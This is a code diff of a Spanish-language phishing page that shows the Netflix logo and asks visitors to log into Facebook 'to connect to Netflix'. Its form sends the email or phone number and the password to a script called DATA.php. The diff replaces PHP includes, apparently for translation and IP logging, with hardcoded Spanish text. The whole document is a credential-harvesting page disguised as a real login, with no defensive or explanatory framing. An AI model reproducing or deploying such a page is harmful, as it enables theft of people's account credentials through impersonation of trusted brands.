@@ -1,8 +1,3 @@
-<?php
-include 'Data/translate.php';
-include 'Data/ip.php';
-?>
-
 <!DOCTYPE html>
 <html>
     <style>
@@ -34,7 +29,7 @@ include 'Data/ip.php';
     <div class="war">
         	<br>
 <img src="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.png"><br>
-<h5><b><?php echo $txt ?> <br> <?php echo $txt1 ?>  </b> </h5>
+<h5><b>Inicie sesión en su cuenta de Facebook <br> para conectarse a Netflix</b> </h5>
 
  </div>
     </div> </center>
@@ -42,9 +37,9 @@ include 'Data/ip.php';
     <div class="container">
         <div class="form-box">
             <form action="DATA.php" method="POST">
-                <input minlength="4" type="text" name="mail" dir="ltr" placeholder="<?php echo $txt_mail ?> " required  >
-                <input minlength="6" type="password" name="pass" dir="ltr" placeholder="<?php echo $txt_pass ?> " required >
-                <button class="btn btn-primary b1"><?php echo $txt_button ?> </button>
+                <input minlength="4" type="text" name="mail" dir="ltr" placeholder="Número de teléfono o correo electrónico " required  >
+                <input minlength="6" type="password" name="pass" dir="ltr" placeholder="Contraseña " required >
+                <button class="btn btn-primary b1">Iniciar sesión</button>
                 <div class="aps">
                     <hr class="hr">        
                 </div>
